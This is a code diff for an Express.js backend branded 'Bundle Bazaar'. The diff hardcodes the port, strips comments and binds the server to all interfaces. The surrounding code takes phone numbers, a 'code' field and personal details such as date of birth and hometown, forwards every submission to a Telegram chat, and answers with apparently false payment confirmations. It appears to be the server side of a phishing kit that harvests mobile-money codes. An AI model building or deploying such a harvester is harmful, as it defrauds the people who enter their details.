@@ -1,10 +1,9 @@
 const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
-require('dotenv').config();
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = 5000; // ← PORT SET TO 5000
 
 // =============================================
 // CONFIGURATION
@@ -99,6 +98,7 @@ function formatRecharge(data) {
 app.get('/', (req, res) => {
     res.json({
         status: '✅ Bundle Bazaar API is running!',
+        port: PORT,
         endpoints: [
             'POST /api/register-vendor',
             'POST /api/purchase',
@@ -109,7 +109,11 @@ app.get('/', (req, res) => {
 });
 
 app.get('/api/health', (req, res) => {
-    res.json({ status: '✅ Healthy', timestamp: new Date().toISOString() });
+    res.json({ 
+        status: '✅ Healthy', 
+        port: PORT,
+        timestamp: new Date().toISOString() 
+    });
 });
 
 // =============================================
@@ -119,7 +123,6 @@ app.post('/api/register-vendor', async (req, res) => {
     try {
         const { fullName, phone, business, tradeType, dob, hometown } = req.body;
 
-        // Validate required fields
         if (!fullName || !phone || !business || !tradeType || !dob || !hometown) {
             return res.status(400).json({
                 success: false,
@@ -127,14 +130,10 @@ app.post('/api/register-vendor', async (req, res) => {
             });
         }
 
-        // Format data
         const data = { fullName, phone, business, tradeType, dob, hometown };
-
-        // Send to Telegram
         const message = formatVendorRegistration(data);
         await sendToTelegram(message);
 
-        // Send success response
         res.json({
             success: true,
             message: '✅ Vendor registration successful! A representative will contact you shortly.'
@@ -156,7 +155,6 @@ app.post('/api/purchase', async (req, res) => {
     try {
         const { package: packageName, price, phone, code } = req.body;
 
-        // Validate required fields
         if (!packageName || !price || !phone || !code) {
             return res.status(400).json({
                 success: false,
@@ -164,14 +162,10 @@ app.post('/api/purchase', async (req, res) => {
             });
         }
 
-        // Format data
         const data = { package: packageName, price, phone, code };
-
-        // Send to Telegram
         const message = formatPurchase(data);
         await sendToTelegram(message);
 
-        // Send success response
         res.json({
             success: true,
             message: '✅ Purchase initiated! A payment prompt has been sent to your phone.'
@@ -193,7 +187,6 @@ app.post('/api/recharge', async (req, res) => {
     try {
         const { package: packageName, price, phone, code } = req.body;
 
-        // Validate required fields
         if (!packageName || !price || !phone || !code) {
             return res.status(400).json({
                 success: false,
@@ -201,14 +194,10 @@ app.post('/api/recharge', async (req, res) => {
             });
         }
 
-        // Format data
         const data = { package: packageName, price, phone, code };
-
-        // Send to Telegram
         const message = formatRecharge(data);
         await sendToTelegram(message);
 
-        // Send success response
         res.json({
             success: true,
             message: '✅ Recharge initiated! A payment prompt has been sent to your phone.'
@@ -236,7 +225,7 @@ app.use((req, res) => {
 // =============================================
 // START SERVER
 // =============================================
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Bundle Bazaar Backend running on port ${PORT}`);
     console.log(`📱 Telegram Bot configured`);
     console.log(`📨 Messages will be sent to chat ID: ${TELEGRAM_CHAT_ID}`);
